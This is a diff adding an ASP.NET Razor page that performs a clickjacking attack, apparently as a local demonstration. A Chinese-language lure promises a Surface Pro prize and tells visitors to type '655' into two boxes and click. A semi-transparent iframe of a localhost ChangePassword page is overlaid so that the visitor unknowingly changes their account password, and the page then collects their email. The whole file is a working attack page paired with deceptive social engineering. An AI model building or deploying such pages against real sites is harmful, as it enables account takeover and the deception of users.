@@ -1,0 +1,56 @@
+﻿
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Surface Pro!!!</title>
+</head>
+<body style="text-align: center;">
+
+    <div style="position: absolute; text-align: center; width: 100%;">
+        <h1 style="font-size: 1.7em;">想要贏得 Surface Pro? 當然可以！！！</h1>
+        <p>
+            在下面2個輸入框，輸入 &quot;655&quot; 然後按下 &quot;我想贏!&quot;. 不用擔心你看不見你輸入的字, 你仍然有贏的機會!!!
+        </p>
+
+        <p>
+            之後, 請輸入 Email 然後按下 &quot;送出!&quot;
+        </p>
+
+        <p>
+            <img src="/Images/SurfacePro.jpg" style="height: 150px;" />
+        </p>
+    </div>
+
+    <div style="position: absolute; text-align: center; width: 100%; top: 357px;">
+        <input type="text" style="width: 215px; height: 23px; margin-right: 28px;" />
+    </div>
+
+    <div style="position: absolute; text-align: center; width: 100%; top: 402px;">
+        <input type="text" style="width: 215px; height: 23px; margin-right: 28px;" />
+    </div>
+
+    <div style="position: absolute; text-align: center; width: 100%; top: 433px;">
+        <input type="submit" value=" 我想贏! " style="width: 140px; font-size: 1.4em; margin-right: 108px;" />
+    </div>
+
+    <form action="/WinSurfacePro" method="POST">
+
+        <div style="position: absolute; text-align: center; width: 100%; top: 635px;">
+            Your email:
+            <input type="text" style="width: 215px; height: 24px; margin-right: 100px;" name="Email" />
+        </div>
+
+        <div style="position: absolute; text-align: center; width: 100%; top: 690px;">
+            <input type="submit" value="送出!" style="font-size: 1.4em; margin-right: 168px;" />
+        </div>
+
+    </form>
+
+    <iframe style="opacity:0.3;margin-top:42px;margin-left:8px;" height="520" width="270"  scrolling="no" src="http://localhost:44375/Account/ChangePassword"></iframe>
+
+</body>
+</html>
